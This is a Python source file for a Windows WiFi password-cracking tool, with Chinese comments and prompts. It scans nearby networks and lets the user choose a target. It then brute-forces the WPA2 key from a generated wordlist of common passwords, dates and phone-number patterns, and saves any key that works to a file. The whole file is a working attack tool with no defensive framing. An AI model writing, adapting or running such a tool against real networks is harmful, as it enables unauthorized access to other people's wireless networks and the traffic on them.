import pywifi
import time
import sys

def scan_wifi():
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()
    if not ifaces:
        print("错误：没有找到无线网卡")
        sys.exit(1)
    iface = ifaces[0]
    iface.scan()
    time.sleep(2)
    results = iface.scan_results()
    return results

def print_wifi_list(networks):
    print("\n" + "=" * 60)
    print("序号\tSSID\t\t\t\t信号强度")
    print("-" * 60)
    for i, network in enumerate(networks, 1):
        ssid_raw = network.ssid
        try:
            display_ssid = ssid_raw.encode('latin1').decode('utf-8')
        except:
            display_ssid = ssid_raw
        if not display_ssid:
            display_ssid = "[隐藏SSID]"
        if len(display_ssid) > 20:
            display_ssid = display_ssid[:17] + "..."
        print(f"{i}\t{display_ssid}\t\t\t{network.signal}")
    print("=" * 60)

def verify_wifi_password(iface, ssid, password):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = pywifi.const.AUTH_ALG_OPEN
    profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
    profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
    profile.key = password
    
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    time.sleep(3)
    return iface.status() == pywifi.const.IFACE_CONNECTED

def generate_passwords():
    """生成高概率密码（约400个）"""
    passwords = []
    
    # 1. 8位纯数字常见组合
    common_8digit = [
        '12345678', '88888888', '00000000', '11111111', '22222222',
        '33333333', '44444444', '55555555', '66666666', '77777777',
        '99999999', '12121212', '11223344', '12344321', '87654321',
        '12341234', '56785678', '66668888', '88886666', '11112222',
        '22221111', '33334444', '44443333', '55556666', '66665555',
        '77778888', '88887777', '99991111', '11223355', '12345670'
    ]
    passwords.extend(common_8digit)
    
    # 2. 常见英文密码
    common_words = [
        'password', 'admin123', 'qwerty123', 'abc123456', 'iloveyou',
        'wifi123', 'router123', '123456789', '987654321', 'qwertyuiop',
        '1qaz2wsx', '1q2w3e4r', 'zaq12wsx', 'qwe123456', 'asdfghjkl',
        'passw0rd', 'admin@123', 'P@ssw0rd', 'Aa123456', 'Qwer1234',
        'a12345678', '12345qwert', 'password123', 'admin888', 'root123'
    ]
    passwords.extend(common_words)
    
    # 3. 年份组合（1980-2025）
    for year in range(1980, 2026):
        passwords.append(str(year))
        passwords.append(f"{year}123")
        passwords.append(f"abc{year}")
        passwords.append(f"pass{year}")
        passwords.append(f"admin{year}")
        passwords.append(f"{year}888")
        passwords.append(f"{year}666")
    
    # 4. 常见单词+数字
    words = ['admin', 'user', 'root', 'wifi', 'router', 'network', 'master', '123456']
    numbers = ['123', '888', '666', '520', '1314', '1234', '8888']
    for word in words:
        for num in numbers:
            passwords.append(f"{word}{num}")
            passwords.append(f"{num}{word}")
            passwords.append(f"{word}{num}{num}")
    
    # 5. 年月日格式（精简版）
    months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12']
    days = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '15', '18', '20', '22', '25', '28', '30']
    for year in ['1990', '1995', '2000', '2005', '2010', '2015', '2020', '2023', '2024']:
        for month in months:
            for day in days:
                passwords.append(f"{year}{month}{day}")
                passwords.append(f"{month}{day}{year}")
            # 只试每月第1天，避免太多
            passwords.append(f"{year}{month}01")
    
    # 6. 手机号前8位常见区段（精简版）
    prefixes = ['130', '131', '132', '133', '134', '135', '136', '137', '138', '139',
                '150', '151', '152', '153', '155', '156', '157', '158', '159',
                '186', '187', '188', '189', '198', '199']
    for prefix in prefixes:
        for suffix in ['0000', '1111', '1234', '5678', '8888', '6666']:
            passwords.append(f"{prefix}{suffix}")
    
    # 去重并返回
    seen = set()
    unique = []
    for p in passwords:
        if p not in seen and len(p) >= 8:  # 只保留8位及以上
            seen.add(p)
            unique.append(p)
    
    return unique

if __name__ == "__main__":
    print("=" * 60)
    print("WiFi 密码破解工具")
    print("=" * 60)
    
    # 检查管理员权限
    import ctypes
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("⚠️  警告：未以管理员身份运行，可能无法正常工作")
        print("建议：关闭窗口，右键点击 PowerShell 选择'以管理员身份运行'\n")
    else:
        print("✓ 管理员权限已确认")
    
    # 初始化网卡
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()
    if not ifaces:
        print("错误：没有找到无线网卡")
        sys.exit(1)
    iface = ifaces[0]
    print(f"使用网卡: {iface.name()}")
    
    # 扫描
    print("正在扫描WiFi网络...")
    wifi_list = scan_wifi()
    print_wifi_list(wifi_list)
    
    # 选择目标
    while True:
        try:
            choice = input("\n请选择要破解的WiFi（输入序号）: ").strip()
            idx = int(choice)
            if 1 <= idx <= len(wifi_list):
                target = wifi_list[idx - 1]
                break
            else:
                print(f"序号范围 1-{len(wifi_list)}")
        except ValueError:
            print("请输入数字序号")
    
    # 解码显示
    try:
        display_name = target.ssid.encode('latin1').decode('utf-8')
    except:
        display_name = target.ssid
    if not display_name:
        display_name = "[隐藏SSID]"
    
    print(f"\n目标: {display_name}")
    print(f"信号强度: {target.signal}")
    
    # 生成密码
    print("\n正在生成密码列表...")
    all_passwords = generate_passwords()
    print(f"共生成 {len(all_passwords)} 个高概率密码")
    print("开始破解... (按 Ctrl+C 停止)\n")
    
    # 开始尝试
    for i, pwd in enumerate(all_passwords, 1):
        print(f"[{i}/{len(all_passwords)}] 尝试: {pwd}")
        
        try:
            if verify_wifi_password(iface, target.ssid, pwd):
                print("\n" + "🎉" * 20)
                print(f"✅ 破解成功！")
                print(f"WiFi: {display_name}")
                print(f"密码: {pwd}")
                print("🎉" * 20)
                
                with open("found_password.txt", "w", encoding='utf-8') as f:
                    f.write(f"WiFi: {display_name}\n")
                    f.write(f"密码: {pwd}\n")
                    f.write(f"尝试次数: {i}\n")
                sys.exit(0)
        except Exception as e:
            print(f"  错误: {e}，跳过")
    
    print("\n❌ 未找到正确密码")
    print("建议：")
    print("1. 确认 WiFi 密码不是复杂密码")
    print("2. 尝试使用更大的密码字典")
    print("3. 直接问主人或查看路由器背面标签")
